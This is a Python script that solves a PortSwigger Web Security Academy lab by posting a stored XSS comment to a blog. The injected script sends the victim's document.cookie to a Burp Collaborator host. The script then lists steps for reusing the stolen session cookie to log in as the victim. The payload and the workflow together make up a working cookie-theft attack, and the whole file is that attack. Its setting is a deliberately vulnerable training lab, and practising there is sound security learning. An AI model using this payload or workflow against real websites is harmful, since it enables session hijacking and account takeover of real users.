# Lab 14 — Exploiting XSS to steal cookies
# PortSwigger: https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies
#
# Vulnerability: Blog comments (stored XSS)
# Aim:           Steal the victim's session cookie via Burp Collaborator, then log in
#
# Technique:
#   Inject a stored XSS payload that POSTs document.cookie to Collaborator.
#   When PortSwigger's simulated victim views the post, their browser executes
#   the script and their session cookie arrives in the Collaborator log.
#
#   Payload:
#     <script>
#     fetch('https://COLLAB', {method:'POST', mode:'no-cors', body:document.cookie});
#     </script>
#
#   After polling Collaborator: extract cookie value from request body.
#   Use it in Burp Repeater: Cookie: session=STOLEN_VALUE
#
# Requires: Burp Suite Pro — update COLLABORATOR_DOMAIN before running.
#
# Usage: python xss_lab14.py <url>

import sys
import urllib3
from proxies import proxies
from xss_utils import banner, section, make_session, post_comment

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ─── UPDATE THIS ────────────────────────────────────────────────────────────
COLLABORATOR_DOMAIN = "YOUR-COLLABORATOR-ID.burpcollaborator.net"
# ────────────────────────────────────────────────────────────────────────────

POST_ID = 1

def build_payload(collab_domain):
    return (
        f"<script>\n"
        f"fetch('https://{collab_domain}', {{\n"
        f"  method: 'POST',\n"
        f"  mode: 'no-cors',\n"
        f"  body: document.cookie\n"
        f"}});\n"
        f"</script>"
    )

if __name__ == "__main__":
    banner()
    section("LAB 14 — EXPLOITING XSS: COOKIE THEFT VIA COLLABORATOR")

    if len(sys.argv) != 2:
        print("  Usage: python xss_lab14.py <url>")
        sys.exit(1)

    if COLLABORATOR_DOMAIN == "YOUR-COLLABORATOR-ID.burpcollaborator.net":
        print("  ✘  Update COLLABORATOR_DOMAIN in the script before running.")
        sys.exit(1)

    url = sys.argv[1]
    session = make_session(proxies)

    payload = build_payload(COLLABORATOR_DOMAIN)
    print(f"  ➜  Posting cookie-theft payload to post {POST_ID}...\n")
    print(f"  Payload:\n{payload}\n")

    r = post_comment(session, url, POST_ID, payload)

    if r is None:
        print("  ✘  Comment submission failed")
        sys.exit(1)

    print(f"  ✔  Comment submitted (status {r.status_code})")
    print()
    print("  ➜  Next steps:")
    print("     1. Open Burp Collaborator → click 'Poll now'")
    print("     2. Find the incoming POST request in the interactions log")
    print("     3. The request body contains the victim's document.cookie value")
    print("     4. Copy the session= value")
    print("     5. In Burp Repeater, send GET /my-account with Cookie: session=STOLEN")
    print()
    print("  ℹ  If HttpOnly is set, document.cookie returns empty — pivot to lab 15.")
